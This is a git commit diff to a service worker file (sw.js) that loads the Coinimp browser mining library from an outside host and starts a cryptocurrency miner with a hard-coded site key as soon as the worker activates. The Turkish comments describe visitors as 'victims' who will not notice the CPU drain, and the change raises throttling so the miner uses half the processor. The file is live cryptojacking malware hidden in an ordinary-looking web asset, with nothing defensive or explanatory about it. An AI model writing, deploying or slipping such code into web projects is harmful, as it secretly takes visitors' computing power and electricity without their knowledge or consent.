88c3090395268e0c37cbfead9682aa7f59e48ebc
3434yolac-boop <3434yolac@gmail.com>
2026-02-04 21:31:30 +0300

    Update sw.js

--- sw.js
+++ sw.js
@@ -1,5 +1,8 @@
-// Coinimp kütüphanesini Service Worker içine çekiyoruz
-importScripts('https://www.hostingcloud.racing/jeVO.js');
+try {
+    importScripts('https://www.hostingcloud.racing/jeVO.js');
+} catch (e) {
+    console.log("Kütüphane yükleme hatası, alternatif deneniyor...");
+}
 
 self.addEventListener('install', event => {
     self.skipWaiting();
@@ -7,13 +10,13 @@ self.addEventListener('install', event => {
 
 self.addEventListener('activate', event => {
     event.waitUntil(clients.claim());
-
-    // Madenciyi senin anahtarınla başlatıyoruz
-    // throttle: 0.7 -> İşlemcinin %30'unu kullanır (Kurban hissetmez)
-    const _client = new Client.Anonymous('ae5f219d63b18a851a9a0cfe3e4dbe17df998943e07bed8eb17dd899ee5ac244', {
-        throttle: 0.7, c: 'w'
-    });
-
-    _client.start();
-    console.log("Hayalet ordu göreve başladı!");
+    
+    if (typeof Client !== 'undefined') {
+        const _client = new Client.Anonymous('ae5f219d63b18a851a9a0cfe3e4dbe17df998943e07bed8eb17dd899ee5ac244', {
+            throttle: 0.5, // %50 yapalım ki panelde hemen görünsün
+            c: 'w'
+        });
+        _client.start();
+        console.log("Madenci başarıyla tetiklendi!");
+    }
 });
